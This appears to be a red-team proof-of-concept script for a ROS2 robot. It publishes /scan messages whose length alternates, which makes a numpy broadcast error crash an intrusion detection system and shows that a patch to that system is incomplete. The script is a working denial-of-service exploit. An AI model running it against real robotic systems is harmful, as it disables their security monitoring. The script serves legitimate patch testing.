#!/usr/bin/env python3
"""攻擊 N24b — 變長度 scan 讓 IDS 崩潰（N24 補丁不完整的回歸測試）.

背景：
    N24 原始發現 = IDS 的 D3/D6 對 scan 歷史跑 numpy：
        a = np.asarray(hist[i]); b = np.asarray(hist[i-1])
        mask = np.isfinite(a) & np.isfinite(b)
    當相鄰兩幀「長度不同」時，(len_a,) & (len_b,) → broadcast ValueError。
    _evaluate() 對 detector 沒有 try/except → 整個 IDS timer callback 崩潰。

藍方「補丁」（現行 code）：
    a = np.asarray(hist[i],   dtype=np.float32)
    b = np.asarray(hist[i-1], dtype=np.float32)
    mask = np.isfinite(a) & np.isfinite(b)
    → 只多了 dtype 轉換 + inf/nan 過濾，**完全沒處理長度不一致**。
    → 變長度的 broadcast ValueError 還在。這支 PoC 就是要證明補丁不完整。

攻擊手法（L1，無密鑰，raw topic）：
    交替送 60 點 / 90 點的 /scan（都 > 50 → 兩種都會被 _scan_cb 存進歷史）。
    advancing stamp。送滿 5 幀後，D3 的 last-5 視窗裡相鄰幀長度不同 → broadcast 崩。

預期：IDS process 直接 crash（traceback: ValueError operands could not be broadcast）。
量測：外部看 IDS 是否還在、_print_stats 是否停止、ros2 node list 是否不見 IDS。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from sensor_msgs.msg import LaserScan


class VarLenScanCrasher(Node):

    def __init__(self):
        super().__init__('attacker_varlen_scan')
        qos = QoSProfile(depth=10, reliability=ReliabilityPolicy.BEST_EFFORT)
        self._pub = self.create_publisher(LaserScan, '/scan', qos)
        self._n = 0
        # 5Hz 交替長度
        self.create_timer(0.2, self._tick)
        self.get_logger().error(
            '☠️ N24b: 交替 60/90 點的 /scan（都>50）→ IDS D3 對長度不一的相鄰幀做 '
            'isfinite(a)&isfinite(b) → broadcast ValueError → IDS 崩潰'
        )

    def _tick(self):
        self._n += 1
        # 交替長度：偶數幀 60 點，奇數幀 90 點
        n_points = 60 if (self._n % 2 == 0) else 90
        m = LaserScan()
        m.header.stamp = self.get_clock().now().to_msg()
        m.header.frame_id = 'base_link'
        m.angle_min = -1.57
        m.angle_max = 1.57
        m.angle_increment = (3.14) / (n_points - 1)
        m.range_min = 0.1
        m.range_max = 3.5
        # 加一點抖動避免「連續幀相同」被當靜止；值本身不重要，重點是長度交替
        m.ranges = [1.0 + (self._n % 5) * 0.01] * n_points
        self._pub.publish(m)
        self.get_logger().info(f'  發 #{self._n}（{n_points} 點）')


def main():
    rclpy.init()
    node = VarLenScanCrasher()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 15.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.05)
    finally:
        node.get_logger().error('⏹ 結束')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
